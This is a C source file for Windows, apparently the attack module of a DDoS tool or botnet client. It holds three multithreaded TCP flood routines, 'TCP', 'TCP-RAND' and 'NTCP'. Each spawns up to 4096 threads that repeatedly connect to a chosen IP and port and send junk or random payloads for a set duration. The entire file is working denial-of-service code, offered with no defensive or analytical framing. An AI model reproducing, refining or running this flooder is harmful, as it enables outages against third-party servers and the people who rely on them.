#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ws2tcpip.h>
#include <time.h>
#include <process.h>
#include "rand.h"
#include "attacks.h"

#pragma comment(lib, "ws2_32.lib")

#define MAX_THREADS 4096
#define CONNECTION_ATTEMPTS_PER_THREAD 500
#define MAX_PACKET_SIZE 8192

DWORD WINAPI optimized_tcp_thread(LPVOID arg);
DWORD WINAPI optimized_tcp_rand_thread(LPVOID arg);
DWORD WINAPI optimized_ntcp_thread(LPVOID arg);

typedef struct {
    char *target;
    int port;
    int time;
    int packet_size;
    
    struct sockaddr_in target_addr;

    char **payloads;
    int num_payloads;
    SOCKET *sockets;
    int num_sockets;
} optimized_attack_args;

DWORD WINAPI optimized_tcp_thread(LPVOID arg) {
    optimized_attack_args *args = (optimized_attack_args *)arg;
    SOCKET sock = INVALID_SOCKET;
    time_t start_time = time(NULL);
    unsigned long mode = 1;
    int max_connections = 0;
    
    const int NUM_SOCKETS = 64;
    SOCKET sockets[NUM_SOCKETS];
    int current_socket = 0;
    
    for (int i = 0; i < NUM_SOCKETS; i++) {
        sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sockets[i] != INVALID_SOCKET) {
            ioctlsocket(sockets[i], FIONBIO, &mode);
            
            int opt = 1;
            setsockopt(sockets[i], SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
            
            setsockopt(sockets[i], IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));

            int buf_size = 1024; 
            setsockopt(sockets[i], SOL_SOCKET, SO_SNDBUF, (char*)&buf_size, sizeof(buf_size));
            setsockopt(sockets[i], SOL_SOCKET, SO_RCVBUF, (char*)&buf_size, sizeof(buf_size));
        }
    }
    
    const int PAYLOAD_SIZE = 32;
    char payload[PAYLOAD_SIZE];
    memset(payload, 0xff, PAYLOAD_SIZE);
    
    while (time(NULL) - start_time < args->time) {
        sock = sockets[current_socket];
        current_socket = (current_socket + 1) % NUM_SOCKETS;
        
        if (sock == INVALID_SOCKET) {
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) {
                continue; 
            }
            sockets[current_socket] = sock;
            ioctlsocket(sock, FIONBIO, &mode);
            
            int opt = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));
        }
        
        connect(sock, (struct sockaddr*)&args->target_addr, sizeof(args->target_addr));

        send(sock, payload, PAYLOAD_SIZE, 0);
        
        max_connections++;

        if (max_connections % 50 == 0) {
            closesocket(sock);
            sockets[current_socket] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sockets[current_socket] != INVALID_SOCKET) {
                ioctlsocket(sockets[current_socket], FIONBIO, &mode);
                int opt = 1;
                setsockopt(sockets[current_socket], SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
                setsockopt(sockets[current_socket], IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));
            }
        }
    }

    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (sockets[i] != INVALID_SOCKET) {
            closesocket(sockets[i]);
        }
    }
    
    free(args);
    return 0;
}

DWORD WINAPI optimized_tcp_rand_thread(LPVOID arg) {
    optimized_attack_args *args = (optimized_attack_args *)arg;
    time_t start_time = time(NULL);
    unsigned long mode = 1;
    int max_connections = 0;

    const int NUM_SOCKETS = 64;
    SOCKET sockets[NUM_SOCKETS];
    int current_socket = 0;

    for (int i = 0; i < NUM_SOCKETS; i++) {
        sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sockets[i] != INVALID_SOCKET) {
            ioctlsocket(sockets[i], FIONBIO, &mode);
            int opt = 1;
            setsockopt(sockets[i], SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
            setsockopt(sockets[i], IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));
        }
    }

    const int PAYLOAD_SIZE = 64;
    const int NUM_PAYLOADS = 16;
    char payloads[NUM_PAYLOADS][PAYLOAD_SIZE];
    
    for (int i = 0; i < NUM_PAYLOADS; i++) {
        for (int j = 0; j < PAYLOAD_SIZE; j++) {
            payloads[i][j] = rand() % 255;
        }
    }
    
    const unsigned char tcp_flags[] = {
        0x02,
        0x12,
        0x10, 
        0x11, 
        0x18  
    };
    
    while (time(NULL) - start_time < args->time) {
        SOCKET sock = sockets[current_socket];
        current_socket = (current_socket + 1) % NUM_SOCKETS;
        
        if (sock == INVALID_SOCKET) {
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) {
                continue;
            }
            sockets[current_socket] = sock;
            ioctlsocket(sock, FIONBIO, &mode);
            
            int opt = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));
        }
        
        connect(sock, (struct sockaddr*)&args->target_addr, sizeof(args->target_addr));
        
        char* payload = payloads[rand() % NUM_PAYLOADS];
        
        payload[0] = tcp_flags[rand() % (sizeof(tcp_flags)/sizeof(tcp_flags[0]))];
        
        for (int i = 0; i < 2; i++) {
            send(sock, payload, PAYLOAD_SIZE, 0);
        }
        
        max_connections++;
        
        if (max_connections % 50 == 0) {
            closesocket(sock);
            sockets[current_socket] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sockets[current_socket] != INVALID_SOCKET) {
                ioctlsocket(sockets[current_socket], FIONBIO, &mode);
                int opt = 1;
                setsockopt(sockets[current_socket], SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
                setsockopt(sockets[current_socket], IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));
            }
        }
    }
    
    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (sockets[i] != INVALID_SOCKET) {
            closesocket(sockets[i]);
        }
    }
    
    free(args);
    return 0;
}

DWORD WINAPI optimized_ntcp_thread(LPVOID arg) {
    optimized_attack_args *args = (optimized_attack_args *)arg;
    time_t start_time = time(NULL);
    unsigned long mode = 1;
    int max_connections = 0;
    
    int packet_size = args->packet_size;
    if (packet_size <= 0 || packet_size > MAX_PACKET_SIZE) {
        packet_size = 1024; 
    }
    
    const int NUM_SOCKETS = 64;
    SOCKET sockets[NUM_SOCKETS];
    int current_socket = 0;

    for (int i = 0; i < NUM_SOCKETS; i++) {
        sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sockets[i] != INVALID_SOCKET) {
            ioctlsocket(sockets[i], FIONBIO, &mode);
            int opt = 1;
            setsockopt(sockets[i], SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
            setsockopt(sockets[i], IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));
        }
    }
    
    const int NUM_PAYLOADS = 8;
    char **payloads = (char**)malloc(NUM_PAYLOADS * sizeof(char*));
    
    if (payloads) {
        for (int i = 0; i < NUM_PAYLOADS; i++) {
            payloads[i] = (char*)malloc(packet_size);
            if (payloads[i]) {
                for (int j = 0; j < packet_size; j++) {
                    payloads[i][j] = rand() % 255;
                }
            }
        }
    }
    
    while (time(NULL) - start_time < args->time) {
        SOCKET sock = sockets[current_socket];
        current_socket = (current_socket + 1) % NUM_SOCKETS;
        
        if (sock == INVALID_SOCKET) {
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) {
                continue;
            }
            sockets[current_socket] = sock;
            ioctlsocket(sock, FIONBIO, &mode);
            
            int opt = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));
        }
        
        connect(sock, (struct sockaddr*)&args->target_addr, sizeof(args->target_addr));

        if (payloads && payloads[max_connections % NUM_PAYLOADS]) {
            send(sock, payloads[max_connections % NUM_PAYLOADS], packet_size, 0);
        }
        
        max_connections++;

        if (max_connections % 50 == 0) {
            closesocket(sock);
            sockets[current_socket] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sockets[current_socket] != INVALID_SOCKET) {
                ioctlsocket(sockets[current_socket], FIONBIO, &mode);
                int opt = 1;
                setsockopt(sockets[current_socket], SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
                setsockopt(sockets[current_socket], IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));
            }
        }
    }
    
    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (sockets[i] != INVALID_SOCKET) {
            closesocket(sockets[i]);
        }
    }
    
    if (payloads) {
        for (int i = 0; i < NUM_PAYLOADS; i++) {
            if (payloads[i]) {
                free(payloads[i]);
            }
        }
        free(payloads);
    }
    
    free(args);
    return 0;
}

void tcp_attack(char *target_ip, int target_port, int duration, int threads) {
    if (threads <= 0 || threads > MAX_THREADS) {
        threads = 16; 
    }
    
    printf("Starting optimized TCP attack on %s:%d with %d threads for %d seconds\n", 
            target_ip, target_port, threads, duration);
    
    HANDLE *thread_handles = (HANDLE*)malloc(threads * sizeof(HANDLE));
    if (!thread_handles) {
        printf("Memory allocation failed\n");
        return;
    }
    
    for (int i = 0; i < threads; i++) {
        optimized_attack_args *args = (optimized_attack_args*)malloc(sizeof(optimized_attack_args));
        if (!args) {
            printf("Failed to allocate memory for thread %d\n", i);
            continue;
        }
        
        args->target = target_ip;
        args->port = target_port;
        args->time = duration;
        
        memset(&args->target_addr, 0, sizeof(args->target_addr));
        args->target_addr.sin_family = AF_INET;
        args->target_addr.sin_port = htons(target_port);
        args->target_addr.sin_addr.s_addr = inet_addr(target_ip);
        
        thread_handles[i] = CreateThread(NULL, 0, optimized_tcp_thread, args, 0, NULL);
        if (thread_handles[i] == NULL) {
            printf("Failed to create thread %d\n", i);
            free(args);
            continue;
        }
        
        SetThreadPriority(thread_handles[i], THREAD_PRIORITY_ABOVE_NORMAL);     
    }
    
    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for (int i = 0; i < threads; i++) {
        if (thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
    
    free(thread_handles);
    printf("TCP attack on %s:%d completed\n", target_ip, target_port);
}

void tcp_rand(char *target_ip, int target_port, int duration, int threads) {
    if (threads <= 0 || threads > MAX_THREADS) {
        threads = 16;
    }
    
    printf("Starting optimized TCP-RAND attack on %s:%d with %d threads for %d seconds\n", 
            target_ip, target_port, threads, duration);
    
    HANDLE *thread_handles = (HANDLE*)malloc(threads * sizeof(HANDLE));
    if (!thread_handles) {
        printf("Memory allocation failed\n");
        return;
    }
    
    for (int i = 0; i < threads; i++) {
        optimized_attack_args *args = (optimized_attack_args*)malloc(sizeof(optimized_attack_args));
        if (!args) {
            printf("Failed to allocate memory for thread %d\n", i);
            continue;
        }
        
        args->target = target_ip;
        args->port = target_port;
        args->time = duration;
        
        memset(&args->target_addr, 0, sizeof(args->target_addr));
        args->target_addr.sin_family = AF_INET;
        args->target_addr.sin_port = htons(target_port);
        args->target_addr.sin_addr.s_addr = inet_addr(target_ip);
        
        thread_handles[i] = CreateThread(NULL, 0, optimized_tcp_rand_thread, args, 0, NULL);
        if (thread_handles[i] == NULL) {
            printf("Failed to create thread %d\n", i);
            free(args);
            continue;
        }
        
        SetThreadPriority(thread_handles[i], THREAD_PRIORITY_ABOVE_NORMAL);
    }
    
    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);
    
    for (int i = 0; i < threads; i++) {
        if (thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
    
    free(thread_handles);
    printf("TCP-RAND attack on %s:%d completed\n", target_ip, target_port);
}

void ntcp_attack(char *target, int port, int time, int packet_size, int threads) {
    if (threads <= 0 || threads > MAX_THREADS) {
        threads = 16;
    }
    
    if (packet_size <= 0 || packet_size > MAX_PACKET_SIZE) {
        packet_size = 1024;
    }
    
    printf("Starting optimized NTCP attack on %s:%d with %d threads, %d byte packets for %d seconds\n", 
            target, port, threads, packet_size, time);
    
    HANDLE *thread_handles = (HANDLE*)malloc(threads * sizeof(HANDLE));
    if (!thread_handles) {
        printf("Memory allocation failed\n");
        return;
    }
    
    for (int i = 0; i < threads; i++) {
        optimized_attack_args *args = (optimized_attack_args*)malloc(sizeof(optimized_attack_args));
        if (!args) {
            printf("Failed to allocate memory for thread %d\n", i);
            continue;
        }
        
        args->target = target;
        args->port = port;
        args->time = time;
        args->packet_size = packet_size;
        
        memset(&args->target_addr, 0, sizeof(args->target_addr));
        args->target_addr.sin_family = AF_INET;
        args->target_addr.sin_port = htons(port);
        args->target_addr.sin_addr.s_addr = inet_addr(target);
        
        thread_handles[i] = CreateThread(NULL, 0, optimized_ntcp_thread, args, 0, NULL);
        if (thread_handles[i] == NULL) {
            printf("Failed to create thread %d\n", i);
            free(args);
            continue;
        }
        
        SetThreadPriority(thread_handles[i], THREAD_PRIORITY_ABOVE_NORMAL);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for (int i = 0; i < threads; i++) {
        if (thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
    
    free(thread_handles);
    printf("NTCP attack on %s:%d completed\n", target, port);
}

